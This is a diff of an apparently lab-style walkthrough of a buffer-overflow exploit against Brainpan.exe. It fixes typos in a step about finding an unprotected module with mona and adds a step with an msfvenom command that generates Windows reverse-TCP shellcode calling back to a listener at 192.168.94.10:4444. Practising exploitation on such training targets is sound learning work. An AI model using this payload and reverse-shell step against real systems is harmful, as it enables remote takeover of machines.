@@ -224,13 +224,13 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 
 ## Step 4 Finding the Right Module.
 
->**If we Type !mona modules we see that **
+>**If we Type !mona modules**
 
 ![eip_vuln_all_False](https://user-images.githubusercontent.com/102399357/232207719-dcbe0868-9373-4b63-9440-c975f59908ea.png)
 
 <br />
 
-### In the above we see that Brainpan.exe itsef it Vuln and all the Stcak Protections are Beinged Set to False ALR which is Address space layout Randomization NEX Non executable stack ,SEH etc.
+### In the above we see that Brainpan.exe itsef it Vuln and all the Stack Protections are Being Set to False ALR which is Address space layout Randomization NEX Non executable stack ,SEH etc.
 
 <br />
 
@@ -252,5 +252,11 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 
 <br />
 
+## Step 5 Genrating The Shell Code
+
+**Moving Furture We will Generate the Reverse TCP shellcode to bypass the firewall if it is Anabled Type the follwing Command To gen erate the shellCode**
+<br  />
+
+>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.94.10 LPORT=4444 EXITFUNC=thread -b "\x00" -f python
 
 
